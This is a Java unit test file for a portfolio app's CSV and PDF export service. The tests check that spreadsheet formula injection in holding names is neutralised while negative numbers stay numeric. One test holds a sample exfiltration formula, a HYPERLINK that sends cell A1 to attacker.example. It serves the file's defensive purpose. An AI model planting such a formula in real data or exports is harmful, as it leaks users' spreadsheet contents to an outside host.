package com.portiq.service;

import com.portiq.dto.HoldingPerformance;
import com.portiq.dto.PerformanceSummary;
import com.portiq.model.HoldingType;
import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

class ExportServiceTest {

    private final ExportService exportService = new ExportService();

    @Test
    void neutralisesAFormulaInAHoldingName() {
        // A name like this is inert in the app and a live exfiltration link the moment the export
        // is opened in Excel. It reaches the database through the CSV and statement importers.
        String malicious = "=HYPERLINK(\"http://attacker.example/?d=\"&A1,\"Click me\")";
        String csv = csvFor(holding("TCS.NS", malicious));

        assertThat(csv).doesNotContain(",\"=HYPERLINK");
        assertThat(csv).contains("'=HYPERLINK");
    }

    @Test
    void neutralisesEveryFormulaTriggerCharacter() {
        for (String trigger : List.of("=cmd", "+1+1", "-2+3", "@SUM(A1)")) {
            String csv = csvFor(holding("TCS.NS", trigger));
            assertThat(csv)
                    .as("a name starting with '%s' must be quoted as text", trigger.charAt(0))
                    .contains("\"'" + trigger + "\"");
        }
    }

    @Test
    void looksPastLeadingWhitespace() {
        // Excel evaluates " =1+1" just as happily as "=1+1".
        String csv = csvFor(holding("TCS.NS", " =1+1"));
        assertThat(csv).contains("\"' =1+1\"");
    }

    @Test
    void leavesAnOrdinaryNameAlone() {
        String csv = csvFor(holding("TCS.NS", "Tata Consultancy Services"));

        assertThat(csv).contains("Tata Consultancy Services");
        assertThat(csv).doesNotContain("'Tata");
    }

    @Test
    void leavesNegativeNumbersAsNumbers() {
        // The naive fix - sanitising every cell - would quote every loss into a string and break
        // the arithmetic the export exists for.
        HoldingPerformance h = holding("TCS.NS", "Tata Consultancy Services");
        h.setGainLoss(new BigDecimal("-1250.00"));
        h.setGainLossPercent(new BigDecimal("-12.50"));

        String csv = csvFor(h);

        assertThat(csv).contains("-1250.00").contains("-12.50");
        assertThat(csv).doesNotContain("'-1250.00");
    }

    @Test
    void producesAPdfWithoutTheTextQuoting() {
        // A PDF is never evaluated, so the values stay exactly as entered.
        byte[] pdf = exportService.toPdf(summaryOf(holding("TCS.NS", "=1+1")));
        assertThat(pdf).isNotEmpty();
        assertThat(new String(pdf, 0, 4, StandardCharsets.ISO_8859_1)).isEqualTo("%PDF");
    }

    private String csvFor(HoldingPerformance holding) {
        return new String(exportService.toCsv(summaryOf(holding)), StandardCharsets.UTF_8);
    }

    private PerformanceSummary summaryOf(HoldingPerformance holding) {
        PerformanceSummary summary = new PerformanceSummary();
        summary.setPortfolioName("All Holdings");
        summary.setTotalCostBasis(new BigDecimal("1000.00"));
        summary.setTotalCurrentValue(new BigDecimal("1100.00"));
        summary.setTotalGainLoss(new BigDecimal("100.00"));
        summary.setGainLossPercent(new BigDecimal("10.00"));
        summary.setHoldings(List.of(holding));
        return summary;
    }

    private HoldingPerformance holding(String ticker, String name) {
        HoldingPerformance h = new HoldingPerformance();
        h.setId(1L);
        h.setTicker(ticker);
        h.setName(name);
        h.setType(HoldingType.STOCK);
        h.setQuantity(new BigDecimal("10"));
        h.setPurchasePrice(new BigDecimal("100.00"));
        h.setCurrentPrice(new BigDecimal("110.00"));
        h.setCostBasis(new BigDecimal("1000.00"));
        h.setCurrentValue(new BigDecimal("1100.00"));
        h.setGainLoss(new BigDecimal("100.00"));
        h.setGainLossPercent(new BigDecimal("10.00"));
        h.setPurchaseDate(LocalDate.of(2024, 1, 15));
        return h;
    }
}
